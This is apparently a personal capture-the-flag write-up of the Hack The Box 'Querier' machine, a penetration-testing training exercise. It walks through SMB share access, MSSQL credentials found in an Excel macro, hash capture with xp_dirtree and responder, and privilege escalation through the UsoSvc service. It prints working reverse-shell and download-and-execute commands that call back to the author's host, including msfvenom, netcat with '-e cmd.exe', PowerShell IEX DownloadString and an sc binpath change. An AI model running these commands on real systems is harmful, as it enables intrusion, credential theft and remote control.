#hackthebox 

NOTE: I need to update impacket. The one I am currently using is written in python2.

# Initial NMAP Scan

![Pasted image 20230302195533](https://user-images.githubusercontent.com/71300144/222975033-326d8045-0779-4f20-98ad-0361c26d9728.png)

SMB and a ms-sql server looks like it is open. Before I investigate, I wanted to do one more quick enumeration with enum4linux `enum4linux -a 10.10.10.125 > enum4linux.txt`. Looks like we found some known user names but nothing else.

![Pasted image 20230302205649](https://user-images.githubusercontent.com/71300144/222975047-d5303b1e-4dd3-4e06-8ab7-75237fb06354.png)

# SMB Enumeration

Lets see if we can list the shares in smb. `smbclient -L ////10.10.10.125//` and we get what looks to be a publically accessible share called 'Reports'.

![Pasted image 20230302195837](https://user-images.githubusercontent.com/71300144/222975065-739d7bd9-b4d3-4702-a605-e29b8d3f15d2.png)

Connecting to the share with the known username as guest `smbclient //10.10.10.125/Reports -U guest` there is one file in the share called 'Currency Volume Report.xlsm' which is an excel file. I tried multiple times to pull down this file but it was not working.

![Pasted image 20230302205821](https://user-images.githubusercontent.com/71300144/222975076-4c6abb65-c84d-446b-b8ee-0fe49738518c.png)

Since I was not able to get the file with the 'get' command I decided to mount the share to my a directory I created called reports.

![Pasted image 20230302205948](https://user-images.githubusercontent.com/71300144/222975092-38b2648d-c7bb-45fb-bd83-820d8a9b53b8.png)

Now that the directory was mounted I just browed to the file in the file explorer and opened it from there.

![Pasted image 20230302210023](https://user-images.githubusercontent.com/71300144/222975106-9bc9101a-3dbe-4111-88fd-cf48cb5baa86.png)

When I opened the document in libre office and I got a message that the file contains Macros. This is interesting. Since I did not know exactly what the macros were I disabled them which is always a good security practice if you do not know what the document / macros are doing. 

![Pasted image 20230302210411](https://user-images.githubusercontent.com/71300144/222975119-0f790006-3cc2-4c0f-afd9-634dfe80f058.png)

I then went to "tools > Macros > Edit Macros" to look at what we were working with. Under "VBAProject > Document Objects > ThisWorkbook" There are some credentials hiding!!

Server = QUERIER
Uid = reporting
Pwd = PcwTWTHRwryjc$c6
Database = Volume

![Pasted image 20230302210051](https://user-images.githubusercontent.com/71300144/222975128-356ef8c5-1b81-4086-b713-6970a8ac7648.png)

This is a VBA (Visual Basic for Applications) macro code used in Microsoft Excel. It defines a subroutine named "Connect" that establishes a connection to a Microsoft SQL Server database and retrieves data from a table named "volume" in the "volume" database. The retrieved data is then copied to the first sheet of the Excel workbook, starting at cell A1.

Here's a breakdown of what each line in the code is doing:

-   The first line specifies the module type as a VBA document module.
-   The second line sets the VBASupport option to 1.
-   The third line starts the definition of the "Connect" subroutine.
-   Lines 5-14 define the variables used in the subroutine and set up a connection to the SQL Server database using the specified connection string.
-   Lines 16-19 check if the connection was successful and execute a SQL query to retrieve data from the "volume" table.
-   Line 20 copies the retrieved data to the first sheet of the Excel workbook, starting at cell A1.
-   Line 21 closes the recordset used to retrieve the data.

Overall, this code is a simple example of how to use VBA to connect to an external data source, retrieve data, and display it in an Excel workbook.

- I tried to connect to the mssql server by running the macros and editing the code some, but ultimately could not get it to work.

# Mssql Server Enumeration

I am no expert by any means but if there was anything that was my weak point, it is messing around with SQL. So, that being said this part took me quite a bit of time and I used a lot of resources to figure things out. 
at this point it was obvious that I needed to connect to the mssql service witht the credentials that I found.

I utilized the below resource to figure out how to do so. 

https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

In my impacket directory I used the following command to connect to the service.

`python2 mssqlclient.py Querier/reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth`

![Pasted image 20230302220248](https://user-images.githubusercontent.com/71300144/222975143-4cba8876-4c0f-4559-aa52-2b9746e14b15.png)

This part of the box took me the longest as I was not familiar with mssql syntax and had to do a lot of googling. Below is one of the resources I found to do so.

If you type help for the 'mssqlclient.py' you get a list of commands available to use. 

I tried to 'enable_xp_cmdshell' but access was denied. The xp_cmdshell will give you command execution on the windows machine not just throught the sql service. I started to manually enumerate.

https://devhints.io/mysql

Checking the username to see who I was if you type help 

![Pasted image 20230302225214](https://user-images.githubusercontent.com/71300144/222975164-c0f61c63-adaf-41a9-8217-90d5205f27d2.png)

Dumping some tables to have a look around

![Pasted image 20230302225325](https://user-images.githubusercontent.com/71300144/222975175-2b45edb4-1939-493d-820c-6f1d26d2a18f.png)

I probably fiddled around with dumping table and looking through things manually, and googling for more than a couple hours and I finally came accross a blog post by REDSIEGE that tipped me off that it is possible to capture a hash through the mssql service using Xp_dirtree!! I also found another blog located at Everyday SQL that explained some what, what Xp_dirtree is. 

https://redsiege.com/tools-techniques/2018/09/capturing-sql-server-user-hash-with-sqli/

- Whenever a Windows system tries to connect to a UNC path, the host will try to authenticate to the remote server by passing the user’s password hash. In other words, I could force the SQL server to authenticate to me and give up the password hash of the user account running the SQL server process! (redsiege, para.4)

https://www.patrickkeisler.com/2012/11/how-to-use-xpdirtree-to-list-all-files.html

Spinning up responder to capture the Hash windows will use to try to authenticate the UNC path.

`sudo responder -I tun0 -dwv`

![Pasted image 20230302231224](https://user-images.githubusercontent.com/71300144/222975190-39836b37-0772-4a34-8660-bc64f8081ff2.png)

Now it is time to execute the Xp_dirtree process and capture the hash 

`EXEC xp_dirtree '\\10.10.14.7\responder',0,1;`

Executing the above command you can see that the hash was captured. The hash is for a different service account called 'mssql-svc'! I saved the hash in a file called 'sql.hash'

![Pasted image 20230302231349](https://user-images.githubusercontent.com/71300144/222975198-fdabffe2-f6ab-4d6b-94b4-55cf0901720b.png)

# Cracking Hashed with John the Ripper

I just ran the hash through john and it cracked in seconds.

`john --wordlist=/usr/share/wordlist/rockyou.txt sql.hash`

![Pasted image 20230302232301](https://user-images.githubusercontent.com/71300144/222975215-3b044410-e852-4b8a-9987-96f43a275092.png)

I went back to the mssql service and logged in with the new found credentials

# Gaining a Foothold / Reverse shell

`python2 mssqlclient.py Querier/mssql-svc:'corporate568'@10.10.10.125 -windows-auth`

![Pasted image 20230303120241](https://user-images.githubusercontent.com/71300144/222975225-6521b3f8-1395-422f-b3d9-6d52aee87f49.png)

As you cans see below I enabled the 'xo_cmdshell' quite a bit because I was not sure what the 0 to 1 meant at first but after thinking about it for a seconds, it just means on and off. 0 is off and 1 is on. I first checked whoami

`xp_cmdshell whoami`

It worked! I have command execution.

![Pasted image 20230303120507](https://user-images.githubusercontent.com/71300144/222975238-8359e0c5-a363-432a-bc2f-89323809bcab.png)

There are some more resources that I came across while doing this box that helped me understand what i was doing at this point to get a reverse shell.

https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/

https://rioasmara.com/2020/01/31/mssql-rce-and-reverse-shell-xp_cmdshell-with-nishang/

At this point I wanted a reverse shell so I looked at the system info with `xp_cmdshell systeminfo`. This is an x64 based machine.

![Pasted image 20230303231207](https://user-images.githubusercontent.com/71300144/222975278-624cf043-8573-48c8-acd0-8ae5e4c448b9.png)

I created an msfvenom reverse sehll to call back to my system

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=9001 -f exe> nem.exe`

![Pasted image 20230303231313](https://user-images.githubusercontent.com/71300144/222975289-89483be9-996e-47a8-9631-51ca1fa3990a.png)

Since smb was open I spun up an smb server and hosted a share where the msfvenom reverse shell was locted.

`python2 /opt/impacket-0.9.19/examples/smbserver.py NEM /home/albert/pnpt/wpe/hackthebox/Querier -smb2support`

![Pasted image 20230303235449](https://user-images.githubusercontent.com/71300144/222975351-6ba75dd0-729d-4e8b-8f10-e5a53ba74b06.png)

Since windowns understands UNC paths all I have to do is use the copy command to transfer the file. I am going to copy it to the temp forder.

`xp_cmdshell copy \\10.10.14.7\NEM\nem.exe C:\windows\temp`

This did not work. It looks like windows defender is on and is blocking this file from being downloaded because it recognizes it as a PUP (potentially unwanted program).

![Pasted image 20230303231445](https://user-images.githubusercontent.com/71300144/222975979-b7610960-0aae-4c28-bdc3-b80774ea3f97.png)

If you do not use the xp_cmdshell command for a while the sql service recognizes this and resets it to 0. So you have to go back and re-enable it.

I decided to just copy nc.exe to see if windows defender will flag it, but it got through no problem.

![Pasted image 20230303232829](https://user-images.githubusercontent.com/71300144/222976024-1ae8a8c8-db9e-4457-9a35-a5f1fcca6ab1.png)

Set up a netcat listener on port 9001 and execute the command

`xp_cmdshell C:\Windows\temp\nc.exe 10.10.14.7 9001 -e cmd.exe`

And a shell is born!

# Post Compromise Enumeration and Escalation

![Pasted image 20230303235349](https://user-images.githubusercontent.com/71300144/222976060-5f0d1d0c-f933-4217-8efa-c841cdae4167.png)

I tried to get winpeas downloaded onto the system with certutil and a simple python http server but access was denied using certutil. Again I spun up a smb server and copied winpeas over that way.

![Pasted image 20230304103645](https://user-images.githubusercontent.com/71300144/222976122-dd8356fa-a526-4e3d-84ae-984965304267.png)

Ran Winpeas.bat but there is so much information, it is hard to sift through. I was getting lost in all the info. 

Anytime I run winpeas.bat on a windows system it turns my text red for the remainder. It is some setting in my preferences I have to figure out.

![Pasted image 20230304105518](https://user-images.githubusercontent.com/71300144/222976132-19032ba2-2f1a-4681-b065-f5eb41f57691.png)

I Decided to try Powerup since it spits out a little bit less information 

`echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7:8081/PowerUp.ps1') | powershell -noprofile -`
- https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters

I downloaded PowerUp this way because at first I tried to do it with the smbserver I have been using, but once I got the program on the windows machine it would not let me execute it. 

Using the command above lets me download and execute in one command.

![Pasted image 20230304110600](https://user-images.githubusercontent.com/71300144/222976154-cdbf7856-0c2f-4a24-9b30-64a91c10fb92.png)

Looking through PowerUp.ps1 was a lot easier than winpeas and immidiately some Administrator credentials stuck out. I thought if these credentials are valid I can just log into mssql service agian with the admin credentials, get a reverse shell calling with nc.exe and have NT Authority/Systme.

![Pasted image 20230304110737](https://user-images.githubusercontent.com/71300144/222976202-22519654-46da-4285-b4dc-9bf13e06b2ef.png)

Unfortunately when you log in with these credentials which are valid you still only get the mssql-svc account, so this was a deaed end.

![Pasted image 20230304111901](https://user-images.githubusercontent.com/71300144/222976214-8280169c-bf60-48ba-984e-353a96951370.png)

I decided to give psexec.py a quick try but this did not work either. I kept getting a connection refused response. 

![Pasted image 20230304112108](https://user-images.githubusercontent.com/71300144/222976231-ebb730b1-181a-4298-bf91-deb375d0c483.png)

Going back to PowerUp and looking at the output there is a service (UsoSvc) that is vulnerable due to an unquoted service path and ran as system on startup!

![Pasted image 20230304113023](https://user-images.githubusercontent.com/71300144/222976261-bc6d959b-4da5-4ecb-a947-f2cdb7364733.png)

I stopped the service and used the following command to change the service path.

`sc config usoSVC binpath="C:\Users\mssql-svc\Downloads\nc.exe 10.10.14.7 9002 -d cmd.exe"`

I almost forgot to mention that I had to download nc.exe on the machine again because it seems that the system removed it from the folder at some point. I downloaded it in the mssql-svc downloads forlder.

The next step was to query the service to see if the path I set was actually successfully set.

`sc qc usosvc`

The path was successfully set. Time to start the service. First set up the nc listener on the attacker machine to catch the shell.

![Pasted image 20230304114828](https://user-images.githubusercontent.com/71300144/222976328-1bb7b5e6-03aa-4e8e-8065-13b6e1db4541.png)

I Kept getting an Error and the service would not start so I decided to reboot the machine because this should work. I have all the required permissions and the path was successfully changed. Admittedly at this point I looked at a couple different writeups to see if this was actually the correct way to escalate and from what I read it was.

![Pasted image 20230304114802](https://user-images.githubusercontent.com/71300144/222976348-0379934f-1160-41e2-b25a-2fe30e1b2868.png)

Restarting the box and getting to the same point I was at I configured the UsoSvc to connect to my machine via nc.exe

- `sc qc UsoSvc`
- `sc config UsoSvc binpath="c:\users\mssql-svc\downloads\nc.exe 10.10.14.7 9002 -d cmd.exe"`
- start nc listener `nc -lvnp 9002`
- `sc stop UsoSvc`
- `sc start UsoSvc`

There it is a reverse shell as NT Authority/System!

![Pasted image 20230304120125](https://user-images.githubusercontent.com/71300144/222976368-cdba5b7c-e674-4470-9b28-fa7dfff5ed06.png)

# Box Owned








